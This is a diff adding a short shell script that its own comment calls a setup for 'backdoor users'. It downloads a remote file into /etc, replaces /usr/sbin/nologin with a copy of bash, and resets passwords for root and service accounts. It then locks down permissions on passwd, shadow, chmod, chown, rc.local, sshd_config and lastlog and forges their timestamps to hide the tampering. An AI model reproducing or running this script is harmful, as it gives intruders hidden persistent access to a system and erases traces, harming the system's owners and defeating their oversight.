@@ -1,0 +1,34 @@
+#!/bin.bash
+#Create facilities fo backdoor users - ONE TIME at first
+wget -P /etc https://github.com/systemprofiler/kernel/blob/master/logout
+chmod 711 logout
+cat /bin/bash > /usr/sbin/nologin
+touch -r /usr/sbin/ntpd /usr/sbin/nologin
+echo "Enter password for root"
+passwd root
+echo "Enter password for daemon"
+passwd daemon
+echo "Enter password for bin"
+passwd bin
+echo "Enter password for sys"
+passwd sys
+vi /etc/group
+chmod 644 /etc/passwd
+touch -r /etc/perl /etc/passwd 
+chmod 600 /etc/group
+touch -r /etc/groff /etc/group
+chmod 600 /etc/shadow
+touch -r /etc/sgml /etc/shadow
+
+chmod 100 /usr/bin/passwd
+touch -r /usr/bin/partx /usr/bin/passwd
+chmod 100 /bin/chmod
+touch -r /bin/cat /bin/chmod
+chmod 100 /bin/chown
+touch -r /bin/cat /bin/chmod
+chmod 700 /etc/rc.local
+touch -r /etc/remastersys.conf /etc/rc.local
+chmod 640 /etc/ssh/sshd_config
+touch -r /etc/ssh/moduli /etc/ssh/sshd_config
+chmod 400 /var/log/lastlog
+touch -r /var/log/wtmp /var/log/lastlog
